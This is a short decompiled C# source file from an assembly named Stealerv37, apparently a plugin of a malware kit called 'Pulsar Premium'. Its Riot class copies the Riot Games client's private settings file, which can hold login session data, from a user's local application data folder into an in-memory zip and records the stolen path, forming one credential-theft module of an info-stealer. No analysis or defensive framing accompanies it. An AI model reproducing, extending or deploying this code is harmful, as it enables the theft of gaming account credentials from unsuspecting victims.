// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Games.Riot
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.IO;

#nullable disable
namespace Intelix.Targets.Games;

public class Riot : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Riot Games", "Riot Client", "Data", "RiotGamesPrivateSettings.yaml");
    if (!File.Exists(path))
      return;
    string entryPath = Path.Combine(nameof (Riot), "RiotGamesPrivateSettings.yaml");
    zip.AddFile(entryPath, File.ReadAllBytes(path));
    counter.Games.Add(new Counter.CounterApplications()
    {
      Name = nameof (Riot),
      Files = {
        $"{path} => {entryPath}"
      }
    });
  }
}
